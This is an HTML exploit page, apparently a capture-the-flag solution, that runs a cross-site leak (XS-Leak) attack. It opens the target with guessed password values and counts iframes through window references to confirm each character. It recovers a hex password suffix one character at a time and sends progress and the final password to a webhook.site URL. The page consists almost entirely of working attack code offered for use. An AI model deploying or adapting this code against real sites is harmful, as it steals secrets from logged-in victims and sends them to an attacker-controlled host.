<!DOCTYPE html>
<html>
<head><title>Final XS-Leak Exploit</title></head>
<body>
<h1>XS-Leak Password Extraction</h1>
<button id="startBtn" onclick="start()" style="padding:10px 20px; font-size:16px;">Start Exploit</button>
<pre id="output"></pre>
<script>
const TARGET = 'https://127.0.0.1:9999/';
const WEBHOOK = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/';
const CHARSET = '0123456789abcdef';
let known = 'lebah';
let testing = false;

function log(msg) {
    document.getElementById('output').textContent += msg + '\n';
}

// Check if iframe exists by attempting to access win[0]
async function check(candidate) {
    if (testing) return false; // Prevent overlapping tests
    testing = true;
    
    return new Promise((resolve) => {
        const win = window.open(TARGET + '?pass=' + encodeURIComponent(candidate));
        
        setTimeout(() => {
            let hasFrame = false;
            try {
                // If win or win[0] access triggers cross-origin error, frame exists
                const frame = win ? win[0] : null;
                hasFrame = (frame !== undefined && frame !== null);
            } catch (e) {
                // Cross-origin error = frame exists
                hasFrame = e.message.includes('cross-origin') || e.message.includes('Blocked');
            }
            
            if (win && !win.closed) {
                try { win.close(); } catch(e) {}
            }
            testing = false;
            resolve(hasFrame);
        }, 1000); // 1 second per test
    });
}

async function start() {
    document.getElementById('startBtn').disabled = true;
    log('Starting exploit...\n');
    
    // Verify oracle
    log('[*] Verifying oracle...');
    const good = await check('lebah');
    const bad = await check('lebahZ');
    log(`  "lebah": ${good} (should be true)`);
    log(`  "lebahZ": ${bad} (should be false)\n`);
    
    if (!good || bad) {
        log('❌ Oracle failed! Make sure bot is logged in.');
        return;
    }
    
    log('✅ Oracle working!\n');
    
    // Leak password
    for (let pos = 0; pos < 6; pos++) { // 6 hex chars after "lebah"
        log(`[*] Position ${pos+1}/6...`);
        let found = false;
        
        for (let c of CHARSET) {
            const candidate = known + c;
            const match = await check(candidate);
            log(`  "${c}": ${match ? '✓' : '✗'}`);
            
            if (match) {
                known = candidate;
                log(`\n✅ Found: ${known}\n`);
                fetch(WEBHOOK + '?progress=' + known).catch(e=>{});
                found = true;
                break;
            }
        }
        
        if (!found) {
            log('\n❌ No match found!');
            break;
        }
    }
    
    log('\n========================================');
    log('PASSWORD: ' + known);
    log('========================================');
    fetch(WEBHOOK + '?PASSWORD=' + known).catch(e=>{});
}

log('Click "Start Exploit" button when ready!\n');
</script>
</body>
</html>
